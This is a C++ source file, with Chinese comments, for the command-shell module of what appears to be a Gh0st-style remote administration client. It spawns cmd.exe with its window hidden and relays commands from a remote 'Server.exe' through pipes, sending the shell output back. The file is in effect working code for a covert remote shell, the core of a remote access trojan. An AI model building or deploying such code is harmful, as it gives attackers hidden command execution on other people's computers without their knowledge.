#include "ClientCmdManager.h"


CClientCmdManager::CClientCmdManager(_CIOCPClient* ClientObject) :CManager(ClientObject)
{
	//创建一组管道与Cmd进程进行进程间通信

	m_CmdProcessHandle = NULL;
	m_CmdThreadHandle = NULL;
	m_ReadHandle1 = NULL;       //Client
	m_WriteHandle1 = NULL;       //Client
	m_ReadHandle2 = NULL;       //Cmd
	m_WriteHandle2 = NULL;       //Cmd


	SECURITY_ATTRIBUTES  SecurityAttributes = { 0 };
	SecurityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	SecurityAttributes.lpSecurityDescriptor = NULL;
	SecurityAttributes.bInheritHandle = TRUE;     //重要   ----->继承关系   

	if (!CreatePipe(&m_ReadHandle1, &m_WriteHandle2, &SecurityAttributes, 0))
	{
		if (m_ReadHandle1 != NULL)
		{
			CloseHandle(m_ReadHandle1);
		}
		if (m_WriteHandle2 != NULL)
		{
			CloseHandle(m_WriteHandle2);
		}
		return;
	}

	if (!CreatePipe(&m_ReadHandle2, &m_WriteHandle1, &SecurityAttributes, 0))
	{
		if (m_WriteHandle1 != NULL)
		{
			CloseHandle(m_WriteHandle1);
		}
		if (m_ReadHandle2 != NULL)
		{
			CloseHandle(m_ReadHandle2);
		}
		return;
	}

	//创建Cmd子进程并且不显示界面
	//获得Cmd FullPath
	char  CmdFullPath[MAX_PATH] = { 0 };
	GetSystemDirectory(CmdFullPath, MAX_PATH);   //C:\windows\system32
												 //C:\windows\system32\cmd.exe
	strcat(CmdFullPath, "\\cmd.exe");

	STARTUPINFO          StartupInfo = { 0 };
	PROCESS_INFORMATION  ProcessInfo = { 0 };


	//一定要初始化该成员
	StartupInfo.cb = sizeof(STARTUPINFO);

	StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	StartupInfo.hStdInput = m_ReadHandle2;                           //将管道数据向Cmd赋值
	StartupInfo.hStdOutput = StartupInfo.hStdError = m_WriteHandle2;

	//窗口隐藏
	StartupInfo.wShowWindow = SW_HIDE;


	//创建Cmd进程
	if (!CreateProcess(CmdFullPath, NULL, NULL, NULL, TRUE,
		NORMAL_PRIORITY_CLASS, NULL, NULL, &StartupInfo, &ProcessInfo))
	{
		CloseHandle(m_ReadHandle1);
		CloseHandle(m_WriteHandle1);
		CloseHandle(m_ReadHandle2);
		CloseHandle(m_WriteHandle2);
		return;
	}

	//保存Cmd进程的进程句柄和主线程句柄
	m_CmdProcessHandle = ProcessInfo.hProcess;
	m_CmdThreadHandle = ProcessInfo.hThread;


	BYTE	IsToken = CLIENT_CMD_MANAGER_REPLY;
	m_ClientObject->OnServerSending((char*)&IsToken, 1);

	m_IsLoop = TRUE;
	WaitForServerDialogOpen();


	//创建读取管道中的数据的线程
	m_ThreadHandle = CreateThread(NULL, 0,
		(LPTHREAD_START_ROUTINE)ReceiveProcedure, (LPVOID)this, 0, NULL);

}
CClientCmdManager::~CClientCmdManager()
{
	printf("~CClientCmdManager()\r\n");

	m_IsLoop = FALSE;


	TerminateThread(m_CmdThreadHandle, 0);     //结束我们自己创建的Cmd线程
	TerminateProcess(m_CmdProcessHandle, 0);   //结束我们自己创建的Cmd进程

	Sleep(100);

	if (m_ReadHandle1 != NULL)
	{
		DisconnectNamedPipe(m_ReadHandle1);
		CloseHandle(m_ReadHandle1);
		m_ReadHandle1 = NULL;
	}
	if (m_WriteHandle1 != NULL)
	{
		DisconnectNamedPipe(m_WriteHandle1);
		CloseHandle(m_WriteHandle1);
		m_WriteHandle1 = NULL;
	}
	if (m_ReadHandle2 != NULL)
	{
		DisconnectNamedPipe(m_ReadHandle2);
		CloseHandle(m_ReadHandle2);
		m_ReadHandle2 = NULL;
	}
	if (m_WriteHandle2 != NULL)
	{
		DisconnectNamedPipe(m_WriteHandle2);
		CloseHandle(m_WriteHandle2);
		m_WriteHandle2 = NULL;
	}
}
void CClientCmdManager::HandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_GO_ON:
	{

		NotifyDialogIsOpen();
		break;
	}
	default:
	{
		//接到有Server.exe发送过来的数据
		//将该数据写进管道
		unsigned long	ReturnLength = 0;
		if (WriteFile(m_WriteHandle1, BufferData, BufferLength, &ReturnLength, NULL))
		{

		}
		break;
	}
	}
}
DWORD CClientCmdManager::ReceiveProcedure(LPVOID ParameterData)
{
	unsigned long   ReturnLength = 0;
	char	v1[0x400] = { 0 };
	DWORD	BufferLength = 0;
	CClientCmdManager* This = (CClientCmdManager*)ParameterData;

	while (This->m_IsLoop)
	{
		Sleep(100);
		//这里检测是否有数据  数据的大小是多少
		while (PeekNamedPipe(This->m_ReadHandle1,     //不是阻塞
			v1, sizeof(v1), &ReturnLength, &BufferLength, NULL))
		{
			//如果没有数据就跳出本本次循环
			if (ReturnLength <= 0)
				break;
			memset(v1, 0, sizeof(v1));
			LPBYTE BufferData = (LPBYTE)LocalAlloc(LPTR, BufferLength);
			//读取管道数据
			ReadFile(This->m_ReadHandle1,
				BufferData, BufferLength, &ReturnLength, NULL);

			This->m_ClientObject->OnServerSending((char*)BufferData, ReturnLength);

			LocalFree(BufferData);

		}
	}
	printf("CClientCmdManager::ReceiveProcedure() 退出\r\n");
	return 0;
}